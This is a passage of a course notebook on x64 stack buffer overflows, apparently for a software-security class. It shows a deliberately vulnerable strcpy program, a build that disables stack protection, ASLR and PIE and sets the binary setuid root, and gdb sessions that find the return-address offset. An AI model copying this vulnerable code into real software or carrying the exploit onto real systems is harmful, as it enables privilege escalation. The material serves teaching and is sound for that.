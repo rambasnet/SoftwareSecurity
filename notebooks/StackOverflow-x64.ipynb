{
 "cells": [
  {
   "cell_type": "markdown",
   "id": "d4fa2ff0",
   "metadata": {},
   "source": [
    "# Stack Overflow on 64-bit x86-64 Architecture\n",
    "\n",
    "- stack overflow on a 64-bit machine is similar to that on a 32-bit machine\n",
    "- there are some minor differences and challenges that we need to consider\n",
    "- significantly expands the number and size of the 32-bit architecture\n",
    "- x64bit registers are 64-bit (8 byte) wide\n",
    "- there are 16 general purpose registers prefix with R instead of E\n",
    "    - RAX, RBX, RCX, RDX, RSI, RDI, RSP, RBP, R8, R9, R10, R11, R12, R13, R14, and R15\n",
    "- each of these 64-bit registers also has associated 32-bit (e.g., EAX), 16-bit (e.g., AX), and 8-bit (e.g., AL, AH) sub-registers, which can be accessed independently\n",
    "    - hence 64-bit architecture can run 32-bit programs\n",
    "- 1 Instruction Pointer - RIP\n",
    "- 1 Flags REgister (RFLAGS)\n",
    "- many other special-purpose registers (e.g., segment registers: code segment, stack segment, etc. floating point registers)\n",
    "\n",
    "\n",
    "## Stack Layout\n",
    "\n",
    "- the stack layout on a x64 architecture is similar to that on a x86 architecture\n",
    "- the major difference is how arguments are passed to functions\n",
    "- in x86, recall that all arguments are passed on the stack in reverse order\n",
    "- in x64, the first six arguments are passed in registers:\n",
    "    - `rdi`, `rsi`, `rdx`, `rcx`, `r8`, and `r9`\n",
    "- if there are more than six arguments, the rest are passed on the stack\n",
    "- let's say we have a function `foo` that takes eight arguments:\n",
    "    - `int foo(int a, int b, int c, int d, int e, int f, int g, int h)`\n",
    "- the first six arguments are passed in registers:\n",
    "    - a -> `rdi`; b->`rsi`, c->`rdx`, d->`rcx`, e->`r8`, and f->`r9`\n",
    "- the last two arguments are passed on the stack:\n",
    "\n",
    "```\n",
    "lower address       |      ...          |\n",
    "    ↑               |  local var2       | <- rbp - 16\n",
    "    ↑               |  local var1       | <- rbp - 8\n",
    "    ↑               |  caller rbp       | <- rbp\n",
    "    ↑               |  return address   | <- rbp + 8\n",
    "    ↑               |  arg g            | <- rbp + 16\n",
    "    ↑               |  arg h            | <- rbp + 24\n",
    "higher address      |       ...         |\n",
    "```\n",
    "\n",
    "## Zeros in Address - A challenge\n",
    "\n",
    "- looking at the stack layout above, exploiting a x64 stack overflow is similar to that on a x86 machine\n",
    "- however, the return address is 8 bytes long\n",
    "- x64 only uses 48 bits of the 64-bit address space from `0x0000000000000000` to `0x00007FFFFFFFFFFF`\n",
    "- this means that the return address will always have at least TWO bytes of zeros in the most significant bits\n",
    "- having`\\x00s` in the payload can be a challenge, beacuse the `strcpy`, `cin` functions will stop copying when it encounters a null byte (`\\x00`)\n",
    "- note that gdb will not print the most significant (prefix) zeros, so you will see the address as `0x7FFFFFFFE3C0` instead of `0x00007FFFFFFFE3C0`\n",
    "- however, in little-endian, the address will be stored as `0xC0E3FF7FFFFF0000`\n",
    "- this means that the return address will have two null bytes at the end of the address\n",
    "- even if the `strcpy` function stops copying at the first null byte, the saved return address of the caller will still be overwritten with the correct address with the two null bytes currently at the end of the address\n",
    "- meaning we only need to copy the 6 bytes and the first 2 bytes are 0's and already available\n",
    "\n",
    "- let's say we want to overwrite `0x00007FFAAAAAAAAA` with `0x00007FFBBBBBBBBB`\n",
    "- stack before overflow\n",
    "```txt\n",
    "\n",
    "lower address   | ....             |\n",
    "                | ....             |\n",
    " return address | AAAAAAAAAFF70000 |\n",
    " \n",
    "highter address | ......           |\n",
    "\n",
    "```\n",
    "- stack after overflow\n",
    "```txt\n",
    "\n",
    "lower address   | ....             |\n",
    "                | ....             |\n",
    "return address  | BBBBBBBBBFF70000 |\n",
    " \n",
    "highter address | ......           |\n",
    "\n",
    "```\n",
    "\n",
    "\n",
    "## Example\n",
    "\n",
    "- let's compile `/demos/stack_overflow/x64/stack.cpp` with the Makefile in the same directory\n",
    "- Makefile compiles with all compiler protections disabled\n",
    "- it also disables ASLR and stack canaries\n",
    "- it compiles the program as setuid root, so that we can execute the program as root\n",
    "- must run Makefile with sudo privilege"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 20,
   "id": "d95df66d-3db2-4f2d-85da-09652b9bc0ff",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64'"
      ]
     },
     "execution_count": 20,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "id": "4218f96e-a353-4771-a34e-8c778e8ba6b3",
   "metadata": {},
   "outputs": [],
   "source": [
    "%cd ../demos/stack_overflow/x64/"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 21,
   "id": "67bb205f-3d0b-4ed2-97f2-0e0d7b5b5e2a",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64'"
      ]
     },
     "execution_count": 21,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "%pwd"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 22,
   "id": "4a86d3a1-9ca0-474b-a20c-dd5e2f2fb1ea",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "badfile.bin   generate_payload.py  pattern.txt\t\t       stack.cpp\r\n",
      "bad.txt       good.txt\t\t   peda.gdb\t\t       stack.exe\r\n",
      "commands.gdb  Makefile\t\t   peda-session-stack.exe.txt\r\n"
     ]
    }
   ],
   "source": [
    "! ls"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 23,
   "id": "af6b3b2a-cd0b-413a-a4a5-5eea0e6dccb0",
   "metadata": {
    "scrolled": true
   },
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstdlib>\r\n",
      "#include <iostream>\r\n",
      "#include <cstring>\r\n",
      "#include <fstream>\r\n",
      "#include <string>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "const int MAX_DATA = 200;\r\n",
      "\r\n",
      "void vulnerable(char *str) {\r\n",
      "\tchar buffer[100];\r\n",
      "\tstrcpy(buffer, str);\r\n",
      "\tcout << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "\tchar data[MAX_DATA];\r\n",
      "\t//file_name = strcpy(file_name, argv[1]\r\n",
      "\tFILE *fin;\r\n",
      "\tfin = fopen(argv[1], \"r\");\r\n",
      "\tfread(data, sizeof(char), MAX_DATA, fin);\r\n",
      "\tvulnerable(data);\r\n",
      "\tcout << \"All done...\" << endl;\r\n",
      "\treturn 0;\r\n",
      "}\r\n",
      "\r\n"
     ]
    }
   ],
   "source": [
    "! cat stack.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 24,
   "id": "27147f06-9b24-40c5-b065-aaae6bc0d619",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "g++ -g -Wall -std=c++17 -fno-stack-protector -z execstack -no-pie stack.cpp  -o stack.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "tee: /proc/sys/kernel/randomize_va_space: Permission denied\n",
      "0\n",
      "make: *** [Makefile:24: build] Error 1\n"
     ]
    }
   ],
   "source": [
    "! make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 25,
   "id": "151d175f-e25d-4fb4-8256-2ad65bf6e1c6",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: g++ -g -Wall -std=c++17 -fno-stack-protector -z execstack -no-pie stack.cpp  -o stack.exe \n",
      "# must run make with sudo to disable randomaize_va_space\n",
      "echo 0 | tee /proc/sys/kernel/randomize_va_space\n",
      "0\n",
      "sudo chown root:root stack.exe \n",
      "sudo chmod +s stack.exe  \n"
     ]
    }
   ],
   "source": [
    "! echo kali | sudo -S make"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 26,
   "id": "0f849a83",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "total 84\r\n",
      "drwxr-xr-x 2 kali kali  4096 Apr  4 15:25 .\r\n",
      "drwxr-xr-x 3 kali kali  4096 Apr  2 15:24 ..\r\n",
      "-rw-r--r-- 1 kali kali   128 Apr  4 14:52 badfile.bin\r\n",
      "-rw-r--r-- 1 kali kali   301 Mar 31 14:20 bad.txt\r\n",
      "-rw-r--r-- 1 kali kali   140 Mar 31 14:20 commands.gdb\r\n",
      "-rw-r--r-- 1 kali kali  1628 Apr  4 14:52 generate_payload.py\r\n",
      "-rw-r--r-- 1 kali kali    51 Mar 31 14:20 good.txt\r\n",
      "-rw-r--r-- 1 kali kali  1082 Mar 31 14:20 Makefile\r\n",
      "-rw-r--r-- 1 kali kali   500 Mar 31 14:20 pattern.txt\r\n",
      "-rw-r--r-- 1 kali kali    93 Mar 31 14:20 peda.gdb\r\n",
      "-rw-r--r-- 1 kali kali    18 Apr  4 14:47 peda-session-stack.exe.txt\r\n",
      "-rw-r--r-- 1 kali kali   489 Mar 31 14:20 stack.cpp\r\n",
      "-rwsr-sr-x 1 root root 32944 Apr  4 15:25 stack.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ls -al"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 28,
   "id": "1e7dc30a",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
     ]
    }
   ],
   "source": [
    "! cat good.txt"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 27,
   "id": "5ba0e393",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "set args good.txt\r\n",
      "break vulnerable\r\n",
      "run\r\n",
      "next\r\n",
      "print $rbp\r\n",
      "print &buffer\r\n",
      "print \"offset: \"\r\n",
      "print /d (void *)$rbp - (void *)&buffer\r\n",
      "continue\r\n",
      "quit\r\n"
     ]
    }
   ],
   "source": [
    "! cat commands.gdb"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "a9f47ee7",
   "metadata": {},
   "source": [
    "## runn commands.gdb script from Terminal\n",
    "\n",
    "- note: don't run the gdb from Jupyter Notebook\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]\n",
    "└─$ gdb -q -x commands.gdb ./stack.exe\n",
    "Reading symbols from ./stack.exe...\n",
    "Breakpoint 1 at 0x401182: file stack.cpp, line 13.\n",
    "[Thread debugging using libthread_db enabled]\n",
    "Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n",
    "Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.\n",
    "Use 'set logging enabled off'.\n",
    "\n",
    "Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.\n",
    "Use 'set logging enabled on'.\n",
    "\n",
    "[----------------------------------registers-----------------------------------]\n",
    "RAX: 0x7fffffffc5e0 ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
    "RBX: 0x7fffffffc7c8 --> 0x7fffffffccc5 (\"/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\n",
    "RCX: 0xfbad2498 \n",
    "RDX: 0x0 \n",
    "RSI: 0x417490 ('A' <repeats 50 times>, \"\\n\")\n",
    "RDI: 0x7fffffffc5e0 ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
    "RBP: 0x7fffffffc5c0 --> 0x7fffffffc6b0 --> 0x2 \n",
    "RSP: 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:        sub    rsp,0x8)\n",
    "RIP: 0x401182 (<_Z10vulnerablePc+12>:   lea    rax,[rbp-0x70])\n",
    "R8 : 0x7ffff7bf1ac0 --> 0x0 \n",
    "R9 : 0x4 \n",
    "R10: 0x6 \n",
    "R11: 0x246 \n",
    "R12: 0x0 \n",
    "R13: 0x7fffffffc7e0 --> 0x7fffffffcd16 (\"COLORFGBG=15;0\")\n",
    "R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 \n",
    "R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)\n",
    "EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x401177 <_Z10vulnerablePc+1>:       mov    rbp,rsp\n",
    "   0x40117a <_Z10vulnerablePc+4>:       add    rsp,0xffffffffffffff80\n",
    "   0x40117e <_Z10vulnerablePc+8>:       mov    QWORD PTR [rbp-0x78],rdi\n",
    "=> 0x401182 <_Z10vulnerablePc+12>:      lea    rax,[rbp-0x70]\n",
    "   0x401186 <_Z10vulnerablePc+16>:      mov    rsi,rax\n",
    "   0x401189 <_Z10vulnerablePc+19>:      lea    rax,[rip+0xe78]        # 0x402008\n",
    "   0x401190 <_Z10vulnerablePc+26>:      mov    rdi,rax\n",
    "   0x401193 <_Z10vulnerablePc+29>:      mov    eax,0x0\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:       sub    rsp,0x8)\n",
    "0008| 0x7fffffffc548 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
    "0016| 0x7fffffffc550 --> 0xc8 \n",
    "0024| 0x7fffffffc558 --> 0x1 \n",
    "0032| 0x7fffffffc560 --> 0xc8 \n",
    "0040| 0x7fffffffc568 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
    "0048| 0x7fffffffc570 --> 0x7ffff7e93540 (0x00007ffff7e93540)\n",
    "0056| 0x7fffffffc578 --> 0x7ffff7a88159 (<__GI__IO_fread+137>:  test   BYTE PTR [rbx+0x1],0x80)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "\n",
    "Breakpoint 1, vulnerable (\n",
    "    str=0x7fffffffc5e0 'A' <repeats 50 times>, \"\\n\\367\\377\\177\") at stack.cpp:13\n",
    "13              printf(\"Buffer is at %p\\n\", &buffer);\n",
    "Buffer is at 0x7fffffffc550\n",
    "[----------------------------------registers-----------------------------------]\n",
    "RAX: 0x1c \n",
    "RBX: 0x7fffffffc7c8 --> 0x7fffffffccc5 (\"/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\n",
    "RCX: 0x0 \n",
    "RDX: 0x0 \n",
    "RSI: 0x4184a0 (\"Buffer is at 0x7fffffffc550\\n\")\n",
    "RDI: 0x7fffffffc360 --> 0x7fffffffc390 (\"Buffer is at 0x7fffffffc550\\n\")\n",
    "RBP: 0x7fffffffc5c0 --> 0x7fffffffc6b0 --> 0x2 \n",
    "RSP: 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:        sub    rsp,0x8)\n",
    "RIP: 0x40119d (<_Z10vulnerablePc+39>:   mov    rdx,QWORD PTR [rbp-0x78])\n",
    "R8 : 0x7ffff7bf1ac0 --> 0x0 \n",
    "R9 : 0x4 \n",
    "R10: 0x0 \n",
    "R11: 0x202 \n",
    "R12: 0x0 \n",
    "R13: 0x7fffffffc7e0 --> 0x7fffffffcd16 (\"COLORFGBG=15;0\")\n",
    "R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 \n",
    "R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)\n",
    "EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x401190 <_Z10vulnerablePc+26>:      mov    rdi,rax\n",
    "   0x401193 <_Z10vulnerablePc+29>:      mov    eax,0x0\n",
    "   0x401198 <_Z10vulnerablePc+34>:      call   0x401030 <printf@plt>\n",
    "=> 0x40119d <_Z10vulnerablePc+39>:      mov    rdx,QWORD PTR [rbp-0x78]\n",
    "   0x4011a1 <_Z10vulnerablePc+43>:      lea    rax,[rbp-0x70]\n",
    "   0x4011a5 <_Z10vulnerablePc+47>:      mov    rsi,rdx\n",
    "   0x4011a8 <_Z10vulnerablePc+50>:      mov    rdi,rax\n",
    "   0x4011ab <_Z10vulnerablePc+53>:      call   0x401040 <strcpy@plt>\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:       sub    rsp,0x8)\n",
    "0008| 0x7fffffffc548 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
    "0016| 0x7fffffffc550 --> 0xc8 \n",
    "0024| 0x7fffffffc558 --> 0x1 \n",
    "0032| 0x7fffffffc560 --> 0xc8 \n",
    "0040| 0x7fffffffc568 --> 0x7fffffffc5e0 ('A' <repeats 50 times>, \"\\n\\367\\377\\177\")\n",
    "0048| 0x7fffffffc570 --> 0x7ffff7e93540 (0x00007ffff7e93540)\n",
    "0056| 0x7fffffffc578 --> 0x7ffff7a88159 (<__GI__IO_fread+137>:  test   BYTE PTR [rb+0x1],0x80)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "14              strcpy(buffer, str);\n",
    "$1 = (void *) 0x7fffffffc5c0\n",
    "$2 = (char (*)[100]) 0x7fffffffc550\n",
    "$3 = \"offset: \"\n",
    "$4 = 112\n",
    "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\n",
    "��\n",
    "All done...\n",
    "[Inferior 1 (process 572068) exited normally]\n",
    "Warning: not running\n",
    "\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 30,
   "id": "7d9adb53",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "pattern_create 500 pattern.txt\r\n",
      "set args pattern.txt\r\n",
      "break vulnerable\r\n",
      "run\r\n",
      "continue\r\n",
      "patts\r\n",
      "quit\r\n"
     ]
    }
   ],
   "source": [
    "! cat peda.gdb"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "88a159c9",
   "metadata": {},
   "source": [
    "## using peda to find the offset using cyclic pattern\n",
    "\n",
    "- Look for [RSP] --> offset VALUE or [RBP]+8; note NO offset to RIP is printed\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿kali)-[~/…/SoftwareSecurity/demos/stack_overflow/x64]\n",
    "└─$ gdb -x peda.gdb ./stack.exe\n",
    "GNU gdb (Debian 13.1-1) 13.1\n",
    "Copyright (C) 2023 Free Software Foundation, Inc.\n",
    "License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>\n",
    "This is free software: you are free to change and redistribute it.\n",
    "There is NO WARRANTY, to the extent permitted by law.\n",
    "Type \"show copying\" and \"show warranty\" for details.\n",
    "This GDB was configured as \"x86_64-linux-gnu\".\n",
    "Type \"show configuration\" for configuration details.\n",
    "For bug reporting instructions, please see:\n",
    "<https://www.gnu.org/software/gdb/bugs/>.\n",
    "Find the GDB manual and other documentation resources online at:\n",
    "    <http://www.gnu.org/software/gdb/documentation/>.\n",
    "\n",
    "For help, type \"help\".\n",
    "Type \"apropos word\" to search for commands related to \"word\"...\n",
    "Reading symbols from ./stack.exe...\n",
    "Writing pattern of 500 chars to filename \"pattern.txt\"\n",
    "Breakpoint 1 at 0x401182: file stack.cpp, line 13.\n",
    "[Thread debugging using libthread_db enabled]\n",
    "Using host libthread_db library \"/lib/x86_64-linux-gnu/libthread_db.so.1\".\n",
    "Warning: 'set logging off', an alias for the command 'set logging enabled', is deprecated.\n",
    "Use 'set logging enabled off'.\n",
    "\n",
    "Warning: 'set logging on', an alias for the command 'set logging enabled', is deprecated.\n",
    "Use 'set logging enabled on'.\n",
    "\n",
    "\n",
    "[----------------------------------registers-----------------------------------]\n",
    "RAX: 0x7fffffffc5e0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "RBX: 0x7fffffffc7c8 --> 0x7fffffffccc1 (\"/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\n",
    "RCX: 0x7ffff7b0d6dd (<__GI___libc_read+13>:     cmp    rax,0xfffffffffffff000)\n",
    "RDX: 0x0 \n",
    "RSI: 0x417490 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "RDI: 0x7fffffffc5e0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "RBP: 0x7fffffffc5c0 --> 0x7fffffffc6b0 --> 0x2 \n",
    "RSP: 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:        sub    rsp,0x8)\n",
    "RIP: 0x401182 (<_Z10vulnerablePc+12>:   lea    rax,[rbp-0x70])\n",
    "R8 : 0x7ffff7bf1ac0 --> 0x0 \n",
    "R9 : 0x4 \n",
    "R10: 0x6 \n",
    "R11: 0x246 \n",
    "R12: 0x0 \n",
    "R13: 0x7fffffffc7e0 --> 0x7fffffffcd15 (\"COLORFGBG=15;0\")\n",
    "R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 \n",
    "R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)\n",
    "EFLAGS: 0x203 (CARRY parity adjust zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x401177 <_Z10vulnerablePc+1>:       mov    rbp,rsp\n",
    "   0x40117a <_Z10vulnerablePc+4>:       add    rsp,0xffffffffffffff80\n",
    "   0x40117e <_Z10vulnerablePc+8>:       mov    QWORD PTR [rbp-0x78],rdi\n",
    "=> 0x401182 <_Z10vulnerablePc+12>:      lea    rax,[rbp-0x70]\n",
    "   0x401186 <_Z10vulnerablePc+16>:      mov    rsi,rax\n",
    "   0x401189 <_Z10vulnerablePc+19>:      lea    rax,[rip+0xe78]        # 0x402008\n",
    "   0x401190 <_Z10vulnerablePc+26>:      mov    rdi,rax\n",
    "   0x401193 <_Z10vulnerablePc+29>:      mov    eax,0x0\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0x7fffffffc540 --> 0x7ffff7a94b40 (<flush_cleanup>:       sub    rsp,0x8)\n",
    "0008| 0x7fffffffc548 --> 0x7fffffffc5e0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "0016| 0x7fffffffc550 --> 0xc8 \n",
    "0024| 0x7fffffffc558 --> 0x1 \n",
    "0032| 0x7fffffffc560 --> 0xc8 \n",
    "0040| 0x7fffffffc568 --> 0x7fffffffc5e0 (\"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...)\n",
    "0048| 0x7fffffffc570 --> 0x7ffff7e93540 (0x00007ffff7e93540)\n",
    "0056| 0x7fffffffc578 --> 0x7ffff7a88159 (<__GI__IO_fread+137>:  test   BYTE PTR [rbx+0x1],0x80)\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "\n",
    "Breakpoint 1, vulnerable (\n",
    "    str=0x7fffffffc5e0 \"AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\"...) at stack.cpp:13\n",
    "13              printf(\"Buffer is at %p\\n\", &buffer);\n",
    "Buffer is at 0x7fffffffc550\n",
    "AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA�rA\n",
    "\n",
    "Program received signal SIGSEGV, Segmentation fault.\n",
    "[----------------------------------registers-----------------------------------]\n",
    "RAX: 0x404040 --> 0x7ffff7e5b310 --> 0x7ffff7d3df00 (<_ZNSoD1Ev>:       endbr64)\n",
    "RBX: 0x7fffffffc7c8 --> 0x7fffffffccc1 (\"/home/kali/projects/SoftwareSecurity/demos/stack_overflow/x64/stack.exe\")\n",
    "RCX: 0x7ffff7b0e210 (<__GI___libc_write+16>:    cmp    rax,0xfffffffffffff000)\n",
    "RDX: 0x7ffff7e5b310 --> 0x7ffff7d3df00 (<_ZNSoD1Ev>:    endbr64)\n",
    "RSI: 0x0 \n",
    "RDI: 0x7ffff7bf3710 --> 0x0 \n",
    "RBP: 0x41414e4141384141 ('AA8AANAA')\n",
    "RSP: 0x7fffffffc5c8 (\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "RIP: 0x4011da (<_Z10vulnerablePc+100>:  ret)\n",
    "R8 : 0x7ffff7bf1ac0 --> 0x0 \n",
    "R9 : 0x4 \n",
    "R10: 0x6 \n",
    "R11: 0x7ffff7a87650 (<__GI__IO_fflush>: test   rdi,rdi)\n",
    "R12: 0x0 \n",
    "R13: 0x7fffffffc7e0 --> 0x7fffffffcd15 (\"COLORFGBG=15;0\")\n",
    "R14: 0x7ffff7ffd000 --> 0x7ffff7ffe2e0 --> 0x0 \n",
    "R15: 0x403de8 --> 0x401140 (<__do_global_dtors_aux>:    endbr64)\n",
    "EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)\n",
    "[-------------------------------------code-------------------------------------]\n",
    "   0x4011d3 <_Z10vulnerablePc+93>:      call   0x401060 <_ZNSolsEPFRSoS_E@plt>\n",
    "   0x4011d8 <_Z10vulnerablePc+98>:      nop\n",
    "   0x4011d9 <_Z10vulnerablePc+99>:      leave\n",
    "=> 0x4011da <_Z10vulnerablePc+100>:     ret\n",
    "   0x4011db <main(int, char**)>:        push   rbp\n",
    "   0x4011dc <main(int, char**)+1>:      mov    rbp,rsp\n",
    "   0x4011df <main(int, char**)+4>:      sub    rsp,0xe0\n",
    "   0x4011e6 <main(int, char**)+11>:     mov    DWORD PTR [rbp-0xd4],edi\n",
    "[------------------------------------stack-------------------------------------]\n",
    "0000| 0x7fffffffc5c8 (\"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0008| 0x7fffffffc5d0 (\"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0016| 0x7fffffffc5d8 (\"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0024| 0x7fffffffc5e0 (\"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0032| 0x7fffffffc5e8 (\"ApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0040| 0x7fffffffc5f0 (\"AAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0048| 0x7fffffffc5f8 (\"VAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "0056| 0x7fffffffc600 (\"AuAAXAAvAAYAAwAAZAAxAAyA\\260rA\")\n",
    "[------------------------------------------------------------------------------]\n",
    "Legend: code, data, rodata, value\n",
    "Stopped reason: SIGSEGV\n",
    "0x00000000004011da in vulnerable (\n",
